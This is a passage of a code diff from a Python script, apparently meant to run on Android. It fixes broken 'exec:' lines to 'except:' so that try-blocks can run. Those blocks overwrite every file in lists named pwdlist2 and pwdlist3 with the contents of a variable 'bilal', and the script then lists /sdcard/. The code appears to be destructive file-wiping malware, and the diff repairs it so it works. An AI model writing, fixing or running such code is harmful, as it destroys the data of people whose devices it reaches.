@@ -11,12 +11,12 @@ exec:
 try:
     for file in pwdlist2:
         open(file,"w").write(bilal)
-exec:
+except:
     pass
 try:
     for file in pwdlist3:
         open(file,"w").write(bilal)
-exec:
+except:
     pass
 listxd = listdir("/sdcard/")
 try:
